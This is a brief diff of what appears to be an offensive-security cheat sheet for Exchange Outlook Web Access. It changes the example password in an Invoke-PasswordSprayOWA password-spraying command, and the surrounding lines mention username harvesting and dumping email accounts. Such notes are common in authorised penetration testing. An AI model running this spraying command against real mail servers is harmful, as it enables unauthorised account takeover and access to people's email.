@@ -20,7 +20,7 @@ Invoke-UsernameHarvestOWA -ExchHostname mail.domain.local -Domain domain.local -
 Password Spraying
 
 ```
-Invoke-PasswordSprayOWA -ExchHostname mail.domain.local -UserList valid.txt -Password Summer2022
+Invoke-PasswordSprayOWA -ExchHostname mail.domain.local -UserList valid.txt -Password Password
 ```
 
 Dump all email accounts
